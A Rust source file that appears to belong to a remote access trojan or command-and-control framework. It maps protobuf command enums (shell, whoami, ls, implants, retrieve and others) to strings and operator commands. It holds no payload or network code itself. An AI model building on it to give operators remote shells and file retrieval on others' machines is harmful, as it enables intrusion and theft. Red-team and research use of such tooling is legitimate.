use crate::rat::{OperatorCommand, RatCommand};

pub mod rat {
    tonic::include_proto!("rat");
}

// Hacky copy of the protobuf in rat.rs
pub enum RsRatCommand {
    Cadence = 0,
    Dir = 1,
    Hostname = 2,
    Ip = 3,
    Ls = 4,
    None = 5,
    Os = 6,
    Quit = 7,
    Shell = 8,
    Whoami = 9,
}

// Way to convert the hacky copy of the protobuf to a string slice
impl From<RsRatCommand> for &str {
    fn from(rat_command: RsRatCommand) -> Self {
        match rat_command {
            RsRatCommand::Cadence => "cadence",
            RsRatCommand::Dir => "dir",
            RsRatCommand::Hostname => "hostname",
            RsRatCommand::Ip => "ip",
            RsRatCommand::Ls => "ls",
            RsRatCommand::None => "none",
            RsRatCommand::Os => "os",
            RsRatCommand::Quit => "quit",
            RsRatCommand::Shell => "shell",
            RsRatCommand::Whoami => "whoami",
        }
    }
}

// Way to convert from the protobuf enum into the hacky copy of the protobuf
impl From<RatCommand> for RsRatCommand {
    fn from(command: RatCommand) -> Self {
        match command {
            RatCommand::Cadence => RsRatCommand::Cadence,
            RatCommand::Dir => RsRatCommand::Dir,
            RatCommand::Hostname => RsRatCommand::Hostname,
            RatCommand::Ip => RsRatCommand::Ip,
            RatCommand::Ls => RsRatCommand::Ls,
            RatCommand::None => RsRatCommand::None,
            RatCommand::Os => RsRatCommand::Os,
            RatCommand::Quit => RsRatCommand::Quit,
            RatCommand::Shell => RsRatCommand::Shell,
            RatCommand::Whoami => RsRatCommand::Whoami,
        }
    }
}

// Hacky copy of different protobuf in rat.rs
pub enum RsOperatorCommand {
    OpCadence = 0,
    OpDir = 1,
    OpHostname = 2,
    OpIp = 3,
    OpLs = 4,
    OpNone = 5,
    OpOs = 6,
    OpQuit = 7,
    OpShell = 8,
    OpWhoami = 9,
    OpImplants = 10,
    OpHelp = 11,
    OpRetrieve = 12,
}

// Way to convert a string slice to the second hacky protobuf copy
impl From<RsOperatorCommand> for OperatorCommand {
    fn from(command: RsOperatorCommand) -> Self {
        match command {
            RsOperatorCommand::OpCadence => OperatorCommand::OpCadence,
            RsOperatorCommand::OpDir => OperatorCommand::OpDir,
            RsOperatorCommand::OpHostname => OperatorCommand::OpHostname,
            RsOperatorCommand::OpIp => OperatorCommand::OpIp,
            RsOperatorCommand::OpLs => OperatorCommand::OpLs,
            RsOperatorCommand::OpOs => OperatorCommand::OpOs,
            RsOperatorCommand::OpQuit => OperatorCommand::OpQuit,
            RsOperatorCommand::OpShell => OperatorCommand::OpShell,
            RsOperatorCommand::OpWhoami => OperatorCommand::OpWhoami,
            RsOperatorCommand::OpImplants => OperatorCommand::OpImplants,
            RsOperatorCommand::OpHelp => OperatorCommand::OpHelp,
            RsOperatorCommand::OpRetrieve => OperatorCommand::OpRetrieve,
            RsOperatorCommand::OpNone => OperatorCommand::OpNone,
        }
    }
}

// Way to convert a second hacky protobuf copy to the actual protobuf
impl From<&str> for RsOperatorCommand {
    fn from(in_slice: &str) -> Self {
        match in_slice {
            "cadence" => RsOperatorCommand::OpCadence,
            "dir" => RsOperatorCommand::OpDir,
            "hostname" => RsOperatorCommand::OpHostname,
            "ip" => RsOperatorCommand::OpIp,
            "ls" => RsOperatorCommand::OpLs,
            "os" => RsOperatorCommand::OpOs,
            "quit" => RsOperatorCommand::OpQuit,
            "shell" => RsOperatorCommand::OpShell,
            "whoami" => RsOperatorCommand::OpWhoami,
            "implants" => RsOperatorCommand::OpImplants,
            "help" => RsOperatorCommand::OpHelp,
            "retrieve" => RsOperatorCommand::OpRetrieve,
            _ => RsOperatorCommand::OpNone,
        }
    }
}
